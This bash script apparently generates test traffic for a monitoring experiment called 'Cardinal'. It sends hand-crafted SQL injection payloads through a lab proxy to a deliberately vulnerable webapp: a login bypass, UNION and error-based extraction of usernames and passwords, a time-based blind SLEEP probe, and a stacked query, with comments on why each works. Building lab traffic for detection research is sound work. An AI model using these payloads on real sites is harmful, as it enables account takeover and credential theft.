#!/bin/bash
# Cardinal Phase 1 — Manual SQLi payloads via curl.
# Hand-crafted inputs with known parse-tree shapes, sent through the proxy.
#
# Query shapes these target (see webapp/app/app.py):
#   /search : SELECT id,name,title,department,email,phone,location
#             FROM directory WHERE name LIKE '%<q>%' ORDER BY name LIMIT 50
#             -> UNION injections must supply 7 columns.
#   /login  : SELECT id,username,display_name FROM users
#             WHERE username='<u>' AND password='<p>'

PROXY="http://172.30.0.10"

echo "[*] Sending manual SQLi payloads through the proxy ($PROXY)"
echo ""

# 1. OR-based auth bypass (login). The concat path makes '1'='1' a live clause.
echo "--- Payload 1: OR-based login bypass ---"
curl -s -X POST "$PROXY/login" \
    --data-urlencode "username=admin' OR '1'='1' -- -" \
    --data-urlencode "password=anything" \
    -o /dev/null -w "HTTP %{http_code}\n"

# 2. UNION-based extraction (search) — 7 columns, exfiltrates users.username/password.
echo "--- Payload 2: UNION SELECT on search (7 cols) ---"
curl -s -G "$PROXY/search" \
    --data-urlencode "q=zzz%' UNION SELECT id,username,password,title,department,bio,status FROM users-- -" \
    -o /dev/null -w "HTTP %{http_code}\n"

# 3. Error-based extraction (search).
echo "--- Payload 3: Error-based extraction ---"
curl -s -G "$PROXY/search" \
    --data-urlencode "q=' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT username FROM users LIMIT 1),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -" \
    -o /dev/null -w "HTTP %{http_code}\n"

# 4. Time-based blind (search). A UNION with SLEEP so the sleep runs exactly
#    once: the LIKE ('%zzz%') matches no rows, then UNION SELECT SLEEP(3),...
#    evaluates the sleep a single time. (A bare `' OR SLEEP(3)` is unreliable
#    here — `name LIKE '%'` is already true, so the OR short-circuits and the
#    sleep never fires; and an AND form would sleep once per matched row.)
echo "--- Payload 4: Time-based blind (expect ~3s) ---"
curl -s -G "$PROXY/search" \
    --data-urlencode "q=zzz%' UNION SELECT SLEEP(3),2,3,4,5,6,7-- -" \
    -o /dev/null -w "HTTP %{http_code}, Time: %{time_total}s\n"

# 5. Stacked query (search). Note: PyMySQL executes a single statement, so this
#    typically errors rather than running two statements — kept to show the shape.
echo "--- Payload 5: Stacked query ---"
curl -s -G "$PROXY/search" \
    --data-urlencode "q='; SELECT * FROM users WHERE '1'='1" \
    -o /dev/null -w "HTTP %{http_code}\n"

# 6. Benign baseline — same endpoint, normal input.
echo "--- Baseline: Normal search ---"
curl -s -G "$PROXY/search" \
    --data-urlencode "q=Alice" \
    -o /dev/null -w "HTTP %{http_code}\n"

echo ""
echo "[*] All payloads sent. Check the monitor for captured traffic."
